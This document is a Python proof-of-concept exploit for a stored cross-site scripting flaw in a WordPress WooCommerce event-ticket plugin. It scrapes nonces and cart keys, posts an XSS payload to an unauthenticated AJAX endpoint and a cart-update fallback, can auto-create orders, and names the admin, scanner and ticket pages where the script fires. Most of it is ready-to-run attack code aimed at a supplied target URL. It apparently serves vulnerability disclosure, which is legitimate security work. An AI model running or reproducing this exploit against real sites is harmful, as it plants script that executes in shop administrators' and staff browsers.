#!/usr/bin/env python3
"""
PoC for Stored XSS

Usage:
  python3 poc.py --url=<product-or-cart-page-URL> [--payload=<xss>] [--count=0]

What it does:
  1. GET --url with a persistent session (establishes WooCommerce session cookies).
  2. Extracts SasoEventticketsValidator_phpObject {ajaxurl, nonce} and data-cart-item-id.
  3. POSTs the XSS payload to the nopriv AJAX endpoint:
       action=sasoEventtickets_executeWCFrontend, a=updateSerialCodeToCartItem
     Fallback: POSTs to the cart-update handler
       saso_eventtickets_request_name_per_ticket[<cart_key>][] = payload
  4. Payload lands in WC()->session -> order-item meta -> codes.meta (on checkout).
     Complete checkout manually in the same session, then trigger admin/scanner sinks.

Only dependency: requests
  pip install requests
"""
import argparse
import re
import sys
import html
from urllib.parse import urljoin, urlparse

DEFAULT_PAYLOAD = "<img src=x onerror=alert(document.domain)>"

def log(msg):
    print(f"[*] {msg}")

def ok(msg):
    print(f"[+] {msg}")

def warn(msg):
    print(f"[!] {msg}")

def extract_nonce(page: str):
    # SasoEventticketsValidator_phpObject = {... "nonce":"abc123" ...}
    m = re.search(r"SasoEventticketsValidator_phpObject.*?['\"]nonce['\"]\s*:\s*['\"]([^'\"]+)['\"]", page, re.S)
    if m:
        return m.group(1)
    # fallback generic: "security":"..." or nonce in wc_frontend localize
    m = re.search(r"['\"]security['\"]\s*:\s*['\"]([a-f0-9]{10,})['\"]", page)
    return m.group(1) if m else None

def extract_ajaxurl(page: str, base: str):
    m = re.search(r"SasoEventticketsValidator_phpObject.*?['\"]ajaxurl['\"]\s*:\s*['\"]([^'\"]+admin-ajax\.php[^'\"]*)['\"]", page, re.S)
    if m:
        u = html.unescape(m.group(1)).replace("\\/", "/")
        return u
    # derive from site base, preserving WP subdir (e.g. /wordpress)
    p = urlparse(base)
    subdir = ""
    parts = [x for x in p.path.split("/") if x]
    if parts and parts[0] not in ("product", "cart", "checkout", "shop", "produk"):
        subdir = "/" + parts[0]
    return f"{p.scheme}://{p.netloc}{subdir}/wp-admin/admin-ajax.php"


def site_root(base: str) -> str:
    p = urlparse(base)
    parts = [x for x in p.path.split("/") if x]
    subdir = ""
    if parts and parts[0] not in ("product", "cart", "checkout", "shop", "produk"):
        subdir = "/" + parts[0]
    return f"{p.scheme}://{p.netloc}{subdir}"


def store_api_add(s, root: str, product_slug_or_id: str):
    """Add ticket product via Woo Store API, return cart_key or None."""
    try:
        pid = None
        if product_slug_or_id.isdigit():
            pid = int(product_slug_or_id)
        else:
            r = s.get(f"{root}/wp-json/wc/store/v1/products?slug={product_slug_or_id}", timeout=20)
            if r.status_code == 200:
                arr = r.json()
                if arr and isinstance(arr, list) and "id" in arr[0]:
                    pid = int(arr[0]["id"])
        if not pid:
            # fallback: poc product in lab is ID 13
            return None
        r0 = s.get(f"{root}/wp-json/wc/store/v1/cart", timeout=20)
        nonce = r0.headers.get("Nonce") or r0.headers.get("X-WC-Store-API-Nonce")
        h = {"Nonce": nonce} if nonce else {}
        r2 = s.post(f"{root}/wp-json/wc/store/v1/cart/add-item", json={"id": pid, "quantity": 1}, headers=h, timeout=20)
        if r2.status_code in (200, 201):
            j = r2.json()
            items = j.get("items", []) if isinstance(j, dict) else []
            if items and "key" in items[-1]:
                return items[-1]["key"]
    except Exception:
        return None
    return None

def extract_cart_keys(page: str):
    # data-cart-item-id="abc123..." rendered in cart / product handlers
    keys = re.findall(r'data-cart-item-id="([^"]+)"', page)
    # also name="saso_eventtickets_request_name_per_ticket[KEY][]"
    keys += re.findall(r'name="saso_eventtickets_request_name_per_ticket\[([^\]]+)\]', page)
    # dedupe, preserve order
    seen, out = set(), []
    for k in keys:
        k = html.unescape(k)
        if k and k not in seen:
            seen.add(k)
            out.append(k)
    return out

def main():
    ap = argparse.ArgumentParser(description="Stored XSS PoC: name_per_ticket -> codes.meta")
    ap.add_argument("--url", required=True, help="Product page or cart page URL, e.g. https://target/product/ticket/")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help=f"XSS payload, max 140 chars (default: {DEFAULT_PAYLOAD})")
    ap.add_argument("--count", default="0", help="cart item count index (default 0)")
    ap.add_argument("--slug", default="", help="Ticket product slug or ID (default: auto from --url; required if --url is cart/checkout)")
    ap.add_argument("--auto-checkout", action="store_true", help="Complete Store API checkout automatically (generic, tries cod/bacs)")
    ap.add_argument("--email", default="attacker@test.test", help="Billing email for --auto-checkout")
    args = ap.parse_args()

    target = args.url
    payload = args.payload
    if len(payload) > 140:
        warn(f"payload is {len(payload)} chars; plugin truncates to 140 via substr() — it will be cut. Use a shorter payload.")
    log(f"target page: {target}")
    log(f"payload ({len(payload)} chars): {payload}")

    try:
        import requests
    except ImportError:
        print("missing dependency: pip install requests", file=sys.stderr)
        sys.exit(2)

    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (PoC) XSS-check"})

    try:
        r = s.get(target, timeout=30)
    except Exception as e:
        warn(f"GET failed: {e}")
        sys.exit(1)
    log(f"GET {r.status_code}, cookies: {len(s.cookies)}")
    page = r.text

    # sanity: is the feature enabled for some product?
    if "saso_eventtickets_request_name_per_ticket" not in page:
        warn("marker saso_eventtickets_request_name_per_ticket not found in this page HTML.")
        warn("Make sure --url is a ticket product/cart page with 'Request name per ticket = yes'. Continuing anyway.")

    nonce = extract_nonce(page)
    ajaxurl = extract_ajaxurl(page, target)
    cart_keys = extract_cart_keys(page)
    # Blocks theme: product/cart HTML has no SasoEventticketsValidator markers and
    # an empty session has no cart_key. Auto-add via Store API in the SAME session.
    if not cart_keys or not nonce:
        try:
            slug = args.slug.strip()
            if not slug:
                slug = urlparse(target).path.rstrip("/").split("/")[-1]
            if slug in ("cart-classic", "cart", "checkout-classic", "checkout", ""):
                ap.error("--slug <ticket-product-slug-or-id> is required when --url is cart/checkout")
            root = site_root(target)
            log(f"trying Store API auto-add at {root} (slug/id={slug}) ...")
            k = store_api_add(s, root, slug)
            if k and k not in cart_keys:
                cart_keys.append(k)
                log(f"auto-add OK, cart_key={k}")
            # re-fetch target with item in cart to get nonce + field markers
            try:
                # for product URLs re-fetch cart-classic if it exists, else same target
                r = s.get(target, timeout=30)
                page = r.text
                n2 = extract_nonce(page)
                if n2:
                    nonce = n2
                k2 = extract_cart_keys(page)
                for kk in k2:
                    if kk not in cart_keys:
                        cart_keys.append(kk)
                a2 = extract_ajaxurl(page, target)
                if "admin-ajax.php" in a2:
                    ajaxurl = a2
                if not nonce:
                    root = site_root(target)
                    for cand in (f"{root}/cart-classic/", f"{root}/cart/"):
                        try:
                            rc = s.get(cand, timeout=20)
                            n3 = extract_nonce(rc.text)
                            if n3:
                                nonce = n3
                                ajaxurl = extract_ajaxurl(rc.text, cand)
                                for kk in extract_cart_keys(rc.text):
                                    if kk not in cart_keys:
                                        cart_keys.append(kk)
                                log(f"nonce recovered from {cand}")
                                break
                        except Exception:
                            continue
            except Exception:
                pass
        except Exception as e:
            warn(f"auto-add failed: {e}")
    log(f"ajaxurl: {ajaxurl}")
    log(f"nonce: {'found (' + nonce[:6] + '...)' if nonce else 'NOT FOUND'}")
    log(f"cart keys: {cart_keys if cart_keys else 'NONE FOUND'}")

    if not nonce:
        warn("nonce not found — fetch the page logged-in as customer (or guest with ticket in cart).")
        warn("Manual fallback: view-source, copy SasoEventticketsValidator_phpObject.nonce, then re-run with browser devtools.")
    if not cart_keys:
        warn("cart_item_id not found — add the ticket product to cart first, then point --url at /cart/.")

    cart_key = cart_keys[0] if cart_keys else "TEST_CART_KEY"
    data_ajax = {
        "action": "sasoEventtickets_executeWCFrontend",
        "a": "updateSerialCodeToCartItem",
        "type": "saso_eventtickets_request_name_per_ticket",
        "cart_item_id": cart_key,
        "cart_item_count": args.count,
        "code": payload,
    }
    if nonce:
        data_ajax["security"] = nonce

    ok("Trying path 1: nopriv AJAX updateSerialCodeToCartItem ...")
    try:
        r2 = s.post(ajaxurl, data=data_ajax, timeout=30)
        log(f"POST ajax -> HTTP {r2.status_code}")
        body = r2.text[:1000]
        print(f"    response preview: {body}")
        if r2.status_code == 200 and ("success" in body or "code" in body):
            ok("AJAX accepted (check 'success' in response). Payload is now in WC()->session.")
        else:
            warn("AJAX did not confirm success — try path 2 below.")
    except Exception as e:
        warn(f"AJAX POST failed: {e}")

    ok("Trying path 2: cart-update handler fallback ...")
    try:
        # woocommerce_cart_updated_handler reads R[saso_eventtickets_request_name_per_ticket][cart_key]
        data_cart = {f"saso_eventtickets_request_name_per_ticket[{cart_key}][]": payload}
        r3 = s.post(target, data=data_cart, timeout=30)
        log(f"POST cart-update -> HTTP {r3.status_code}")
    except Exception as e:
        warn(f"cart-update POST failed: {e}")

    if args.auto_checkout:
        try:
            root = site_root(target)
            ok("Trying auto-checkout via Woo Store API ...")
            rc = s.get(f"{root}/wp-json/wc/store/v1/cart", timeout=20)
            snonce = rc.headers.get("Nonce") or rc.headers.get("X-WC-Store-API-Nonce")
            methods = ["cod", "bacs", "cheque", "paypal"]
            try:
                j0 = rc.json()
                if isinstance(j0, dict) and j0.get("payment_methods"):
                    methods = list(j0["payment_methods"]) + [m for m in methods if m not in j0["payment_methods"]]
            except Exception:
                pass
            log(f"payment candidates: {methods}")
            order_ok = None
            for pm in methods:
                try:
                    rcc = s.get(f"{root}/wp-json/wc/store/v1/cart", timeout=20)
                    sn = rcc.headers.get("Nonce") or snonce
                    hh = {"Nonce": sn} if sn else {}
                    body = {
                        "billing_address": {"first_name": "Att", "last_name": "Ack", "address_1": "Jl 1", "city": "Jakarta", "postcode": "10110", "country": "ID", "email": args.email},
                        "payment_method": pm,
                    }
                    rp = s.post(f"{root}/wp-json/wc/store/v1/checkout", json=body, headers=hh, timeout=30)
                    log(f"checkout [{pm}] -> HTTP {rp.status_code}")
                    if rp.status_code in (200, 201):
                        try:
                            jo = rp.json()
                            if jo.get("order_id"):
                                order_ok = jo
                                ok(f"order created: id={jo.get('order_id')} key={jo.get('order_key')} via {pm}")
                                pr = jo.get("payment_result", {}) or {}
                                if pr.get("redirect_url"):
                                    log(f"redirect: {pr.get('redirect_url')}")
                                break
                        except Exception:
                            pass
                    else:
                        log(f"body: {rp.text[:300]}")
                except Exception as e:
                    warn(f"checkout [{pm}] failed: {e}")
            if not order_ok:
                warn("auto-checkout failed — complete checkout manually in the same session.")
        except Exception as e:
            warn(f"auto-checkout error: {e}")

    print()
    if not args.auto_checkout:
        ok("Next (manual, 1 minute): complete checkout in the SAME session/browser.")
    print("  The payload flows: session -> order-item meta -> add_serialcode_to_order_forItem()")
    print("                   -> setWoocommerceTicketInfoForCode() -> codes.meta JSON (substr 140).")
    print()
    ok("Trigger (victim):")
    print("  A. Admin  : Event Tickets > Codes > expand code (backend.js:6860 .html() + :6888 value=\"...\").")
    print("  B. Scanner: open scanner page, scan QR / GET retrieve_ticket?code=<code> (ticket_scanner.js:1855 .html()).")
    print("  C. Ticket : open ticket detail URL (TicketDesigner.php:508 Twig autoescape false).")
    print()
    log("Done. If both POSTs failed, do it by hand in devtools:")
    print(f'  fetch("{ajaxurl}",{{method:"POST",headers:{{"Content-Type":"application/x-www-form-urlencoded"}},')
    print(f'    body:new URLSearchParams({{action:"sasoEventtickets_executeWCFrontend",a:"updateSerialCodeToCartItem",')
    print(f'    type:"saso_eventtickets_request_name_per_ticket",cart_item_id:"{cart_key}",cart_item_count:"{args.count}",code:{payload!r},security:"NONCE"}})}})')

if __name__ == "__main__":
    main()
